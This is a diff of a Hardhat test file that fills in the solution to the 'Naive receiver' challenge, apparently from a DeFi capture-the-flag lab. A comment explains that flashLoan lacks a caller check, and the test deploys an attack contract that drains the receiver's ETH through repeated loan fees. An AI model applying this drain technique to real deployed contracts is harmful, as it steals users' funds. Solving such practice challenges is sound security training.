@@ -27,10 +27,19 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+        // console.log(await ethers.provider.getBalance(deployer.address));
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        /**
+         * I created an AttackNaiveReceiver contract, with method that runs lenders' method flashLoan with a loop as long as receiver has 1 eth.
+         * This is created, because neither lender or receiver check who is calling method flashLoan, so attacker can run flashLoan and beacue fee is 1 ETH
+         * receiver will quickly loose all ethers.
+         */
+        const AttackNaiveReceiver = await ethers.getContractFactory('AttackNaiveReceiver', deployer);
+        this.attack = await AttackNaiveReceiver.deploy();
+        await this.attack.attack(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
